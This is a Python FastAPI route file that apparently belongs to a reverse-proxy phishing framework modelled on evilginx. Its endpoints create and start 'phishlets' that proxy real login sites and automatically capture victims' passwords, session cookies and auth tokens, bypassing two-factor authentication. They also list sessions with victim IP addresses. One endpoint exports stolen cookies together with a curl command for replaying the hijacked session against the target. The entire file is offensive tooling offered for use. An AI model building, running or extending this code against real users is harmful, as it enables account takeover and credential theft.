"""
Browser-in-the-Middle (BitM) / Reverse Proxy Phishing Routes

Provides a full-featured reverse proxy phishing system similar to evilginx.
Supports credential capture, session hijacking, and 2FA bypass.
"""

from fastapi import APIRouter, HTTPException, Query
from pydantic import BaseModel
from typing import Optional, Dict, List
from datetime import datetime
import uuid

from app.services.proxy_engine import (
    proxy_engine,
    PhishletConfig,
    CapturedSession,
    PHISHLET_TEMPLATES,
    get_phishlet_template
)

router = APIRouter(tags=["Browser-in-the-Middle"])


# ============== Pydantic Models ==============

class PhishletCreate(BaseModel):
    """Create a new phishlet"""
    name: str
    target_host: str
    phishing_host: str
    target_scheme: str = "https"
    capture_cookies: List[str] = []
    capture_fields: List[str] = ["username", "password", "email", "login", "passwd"]
    auth_tokens: List[str] = []
    auth_urls: List[str] = []
    sub_filters: Dict[str, str] = {}
    js_inject: Optional[str] = None


class PhishletFromTemplate(BaseModel):
    """Create phishlet from template"""
    template_name: str
    your_domain: str
    company: str = "company"


class StartPhishletRequest(BaseModel):
    """Request to start a phishlet"""
    port: int = 8020


# ============== Template Endpoints ==============

@router.get("/templates")
async def get_templates():
    """Get available phishlet templates"""
    templates = []
    for name, config in PHISHLET_TEMPLATES.items():
        templates.append({
            'id': name,
            'name': config.name,
            'target_url': f"{config.target_scheme}://{config.target_host}",
            'target_host': config.target_host,
            'description': f"Proxy for {config.name}",
            'capture_cookies': len(config.capture_cookies) > 0,
            'capture_fields': config.capture_fields,
            'auth_urls': config.auth_urls,
            'auth_indicators': config.auth_urls,
            'browser_type': 'proxy',
        })
    return {'templates': templates}


# ============== Phishlet Management ==============

@router.get("/phishlets")
async def list_phishlets():
    """List all configured phishlets"""
    phishlets = []
    for pid, config in proxy_engine.phishlets.items():
        phishlets.append({
            'id': pid,
            'name': config.name,
            'target_host': config.target_host,
            'phishing_host': config.phishing_host,
            'is_active': config.is_active,
            'listen_port': config.listen_port,
            'capture_cookies': config.capture_cookies,
            'capture_fields': config.capture_fields,
            'auth_urls': config.auth_urls,
            'sessions_count': len([s for s in proxy_engine.sessions.values() if s.phishlet_id == pid]),
            'authenticated_count': len([s for s in proxy_engine.sessions.values() if s.phishlet_id == pid and s.authenticated]),
        })
    return {'phishlets': phishlets, 'count': len(phishlets)}


@router.post("/phishlets")
async def create_phishlet(data: PhishletCreate):
    """Create a custom phishlet"""
    phishlet_id = str(uuid.uuid4())[:8]

    config = PhishletConfig(
        id=phishlet_id,
        name=data.name,
        target_host=data.target_host,
        phishing_host=data.phishing_host,
        target_scheme=data.target_scheme,
        capture_cookies=data.capture_cookies,
        capture_fields=data.capture_fields,
        auth_tokens=data.auth_tokens,
        auth_urls=data.auth_urls,
        sub_filters=data.sub_filters,
        js_inject=data.js_inject,
    )

    proxy_engine.add_phishlet(config)

    return {
        'id': phishlet_id,
        'name': config.name,
        'target_host': config.target_host,
        'phishing_host': config.phishing_host,
        'message': 'Phishlet created successfully'
    }


@router.post("/phishlets/from-template")
async def create_from_template(data: PhishletFromTemplate):
    """Create a phishlet from a pre-built template"""
    config = get_phishlet_template(data.template_name, data.your_domain, data.company)

    if not config:
        raise HTTPException(status_code=404, detail=f"Template '{data.template_name}' not found")

    proxy_engine.add_phishlet(config)

    return {
        'id': config.id,
        'name': config.name,
        'target_host': config.target_host,
        'phishing_host': config.phishing_host,
        'capture_cookies': config.capture_cookies,
        'auth_urls': config.auth_urls,
        'sub_filters': config.sub_filters,
        'message': f'Phishlet created from {data.template_name} template'
    }


@router.get("/phishlets/{phishlet_id}")
async def get_phishlet(phishlet_id: str):
    """Get details of a specific phishlet"""
    config = proxy_engine.get_phishlet(phishlet_id)
    if not config:
        raise HTTPException(status_code=404, detail="Phishlet not found")

    return {
        'id': config.id,
        'name': config.name,
        'target_host': config.target_host,
        'phishing_host': config.phishing_host,
        'target_scheme': config.target_scheme,
        'is_active': config.is_active,
        'listen_port': config.listen_port,
        'capture_cookies': config.capture_cookies,
        'capture_fields': config.capture_fields,
        'auth_tokens': config.auth_tokens,
        'auth_urls': config.auth_urls,
        'sub_filters': config.sub_filters,
    }


@router.delete("/phishlets/{phishlet_id}")
async def delete_phishlet(phishlet_id: str):
    """Delete a phishlet"""
    config = proxy_engine.get_phishlet(phishlet_id)
    if not config:
        raise HTTPException(status_code=404, detail="Phishlet not found")

    # Stop if running
    if config.is_active:
        await proxy_engine.stop_phishlet(phishlet_id)

    proxy_engine.remove_phishlet(phishlet_id)
    return {'status': 'deleted', 'id': phishlet_id}


# ============== Phishlet Control ==============

@router.post("/phishlets/{phishlet_id}/start")
async def start_phishlet(phishlet_id: str, port: int = Query(default=8020)):
    """Start a phishlet proxy server"""
    config = proxy_engine.get_phishlet(phishlet_id)
    if not config:
        raise HTTPException(status_code=404, detail="Phishlet not found")

    # Start the phishlet (will start server if needed)
    try:
        result = await proxy_engine.start_phishlet(phishlet_id, port)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

    actual_port = result.get('port', port)
    proxy_url = f"http://localhost:{actual_port}/{phishlet_id}/"

    return {
        'status': 'running',
        'phishlet_id': phishlet_id,
        'name': config.name,
        'port': actual_port,
        'proxy_url': proxy_url,
        'instructions': [
            f"1. Open the proxy URL: {proxy_url}",
            f"2. This proxies requests to {config.target_host}",
            "3. Credentials and session cookies will be captured automatically",
            "4. Check /sessions endpoint for captured data",
        ],
    }


@router.post("/phishlets/{phishlet_id}/stop")
async def stop_phishlet(phishlet_id: str):
    """Stop a running phishlet"""
    config = proxy_engine.get_phishlet(phishlet_id)
    if not config:
        raise HTTPException(status_code=404, detail="Phishlet not found")

    if not config.is_active:
        raise HTTPException(status_code=400, detail="Phishlet is not running")

    await proxy_engine.stop_phishlet(phishlet_id)

    return {'status': 'stopped', 'phishlet_id': phishlet_id}


# ============== Session Management ==============

@router.get("/sessions")
async def list_sessions(phishlet_id: Optional[str] = None, authenticated_only: bool = False):
    """List captured sessions"""
    sessions = proxy_engine.get_sessions(phishlet_id)

    if authenticated_only:
        sessions = [s for s in sessions if s.authenticated]

    result = []
    for session in sessions:
        result.append({
            'id': session.id,
            'phishlet_id': session.phishlet_id,
            'victim_ip': session.victim_ip,
            'user_agent': session.user_agent,
            'created_at': session.created_at,
            'authenticated': session.authenticated,
            'authenticated_at': session.authenticated_at,
            'credentials_count': len(session.credentials),
            'cookies_count': len(session.cookies),
            'tokens_count': len(session.tokens),
            'requests_count': len(session.requests),
            'landing_url': session.landing_url,
        })

    return {'sessions': result, 'count': len(result)}


@router.get("/sessions/{session_id}")
async def get_session(session_id: str):
    """Get detailed session information"""
    session = proxy_engine.get_session(session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")

    return {
        'id': session.id,
        'phishlet_id': session.phishlet_id,
        'victim_ip': session.victim_ip,
        'user_agent': session.user_agent,
        'created_at': session.created_at,
        'authenticated': session.authenticated,
        'authenticated_at': session.authenticated_at,
        'landing_url': session.landing_url,
        'credentials': session.credentials,
        'cookies': session.cookies,
        'tokens': session.tokens,
        'requests': session.requests[-50:],  # Last 50 requests
    }


@router.delete("/sessions/{session_id}")
async def delete_session(session_id: str):
    """Delete a captured session"""
    if session_id not in proxy_engine.sessions:
        raise HTTPException(status_code=404, detail="Session not found")

    del proxy_engine.sessions[session_id]
    return {'status': 'deleted', 'id': session_id}


@router.post("/sessions/{session_id}/export")
async def export_session(session_id: str, format: str = Query(default="header")):
    """
    Export session cookies in various formats.

    Formats:
    - header: Cookie header for curl/browser (default)
    - json: JSON object
    - netscape: Netscape cookie jar format
    """
    session = proxy_engine.get_session(session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")

    content = proxy_engine.export_session_cookies(session_id, format)

    if format == 'header':
        phishlet = proxy_engine.get_phishlet(session.phishlet_id)
        target = phishlet.target_host if phishlet else 'example.com'
        return {
            'format': 'header',
            'content': content,
            'usage': f'curl -H "Cookie: {content}" https://{target}/'
        }
    elif format == 'json':
        return {
            'format': 'json',
            'cookies': session.cookies,
            'tokens': session.tokens,
            'credentials': session.credentials,
        }
    else:
        return {
            'format': format,
            'content': content
        }


# ============== Statistics ==============

@router.get("/stats")
async def get_stats():
    """Get proxy engine statistics"""
    raw_stats = proxy_engine.get_stats()

    # Add recent activity
    recent_sessions = sorted(
        proxy_engine.sessions.values(),
        key=lambda s: s.created_at,
        reverse=True
    )[:5]

    # Map to frontend expected field names
    return {
        'total_targets': raw_stats['total_phishlets'],
        'active_sessions': raw_stats['active_phishlets'],
        'authenticated_sessions': raw_stats['authenticated_sessions'],
        'captures_with_cookies': raw_stats['total_cookies'],
        'total_credentials': raw_stats['total_credentials'],
        'total_sessions': raw_stats['total_sessions'],
        'recent_sessions': [
            {
                'id': s.id,
                'victim_ip': s.victim_ip,
                'authenticated': s.authenticated,
                'created_at': s.created_at
            }
            for s in recent_sessions
        ]
    }


# ============== Targets (Legacy Compatibility) ==============
# These endpoints maintain compatibility with the frontend

@router.get("/targets")
async def get_targets():
    """List phishlets as targets (for frontend compatibility)"""
    targets = []
    for pid, config in proxy_engine.phishlets.items():
        targets.append({
            'id': pid,
            'name': config.name,
            'target_url': f"{config.target_scheme}://{config.target_host}",
            'description': f"Reverse proxy for {config.target_host}",
            'browser_type': 'proxy',
            'viewport_width': 1920,
            'viewport_height': 1080,
            'capture_screenshots': False,
            'capture_network': True,
            'capture_cookies': len(config.capture_cookies) > 0,
            'capture_storage': True,
            'auth_indicators': config.auth_urls,
            'created_at': datetime.now().isoformat(),
            'sessions_count': len([s for s in proxy_engine.sessions.values() if s.phishlet_id == pid]),
            'captures_count': len([s for s in proxy_engine.sessions.values() if s.phishlet_id == pid and s.authenticated]),
        })
    return {'targets': targets, 'count': len(targets)}


@router.post("/targets")
async def create_target(data: dict):
    """Create a phishlet from target data (for frontend compatibility)"""
    # Extract host from target_url
    target_url = data.get('target_url', '')
    if '://' in target_url:
        target_host = target_url.split('://')[1].split('/')[0]
        target_scheme = target_url.split('://')[0]
    else:
        target_host = target_url
        target_scheme = 'https'

    phishlet_id = str(uuid.uuid4())[:8]

    config = PhishletConfig(
        id=phishlet_id,
        name=data.get('name', 'Custom Target'),
        target_host=target_host,
        phishing_host=data.get('phishing_host', f"phish-{phishlet_id}.localhost"),
        target_scheme=target_scheme,
        capture_fields=data.get('capture_fields', ["username", "password", "email", "login"]),
        auth_urls=data.get('auth_indicators', []),
    )

    proxy_engine.add_phishlet(config)

    return {
        'id': phishlet_id,
        'name': config.name,
        'target_url': f"{config.target_scheme}://{config.target_host}",
        'phishing_host': config.phishing_host,
        'created_at': datetime.now().isoformat(),
    }


@router.delete("/targets/{target_id}")
async def delete_target(target_id: str):
    """Delete a target/phishlet"""
    return await delete_phishlet(target_id)


@router.post("/sessions/start")
async def start_session_compat(target_id: str = Query(...), listen_port: int = Query(default=8020)):
    """Start a phishlet session (for frontend compatibility)"""
    config = proxy_engine.get_phishlet(target_id)
    if not config:
        raise HTTPException(status_code=404, detail="Phishlet not found")

    # Start the phishlet (will start server if needed)
    try:
        result = await proxy_engine.start_phishlet(target_id, listen_port)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

    # Use the actual port from the result
    actual_port = result.get('port', listen_port)
    proxy_url = f"http://localhost:{actual_port}/{target_id}/"

    return {
        'status': 'running',
        'session': {
            'id': target_id,
            'target_id': target_id,
            'target_name': config.name,
            'target_url': f"{config.target_scheme}://{config.target_host}",
            'proxy_url': proxy_url,
            'port': actual_port,
            'status': 'active',
        },
        'instructions': [
            f"Open the proxy URL in your browser: {proxy_url}",
            f"This will proxy requests to {config.target_host}",
            "Any credentials entered will be captured automatically",
            "Check the Captures tab for captured data",
        ],
        'technical_notes': [
            f"Target: {config.target_host}",
            f"Proxy URL: {proxy_url}",
            f"Capture fields: {', '.join(config.capture_fields)}",
            f"Auth URLs monitored: {len(config.auth_urls)} URLs",
        ],
    }


@router.get("/captures")
async def get_captures():
    """Get authenticated sessions as captures (for frontend compatibility)"""
    captures = []
    for session in proxy_engine.get_authenticated_sessions():
        captures.append({
            'id': session.id,
            'session_id': session.id,
            'target_name': proxy_engine.phishlets.get(session.phishlet_id, PhishletConfig(id='', name='Unknown', target_host='', phishing_host='')).name,
            'target_url': '',
            'victim_ip': session.victim_ip,
            'captured_at': session.authenticated_at or session.created_at,
            'cookies': session.cookies,
            'local_storage': {},
            'session_storage': {},
            'credentials': session.credentials,
            'screenshots': [],
            'network_requests': session.requests[-10:],
            'authenticated': session.authenticated,
        })
    return {'captures': captures, 'count': len(captures)}


@router.post("/captures/{capture_id}/export")
async def export_capture(capture_id: str, export_format: str = Query(default="json")):
    """Export captured session data"""
    return await export_session(capture_id, export_format)


@router.delete("/captures/{capture_id}")
async def delete_capture(capture_id: str):
    """Delete a capture"""
    return await delete_session(capture_id)
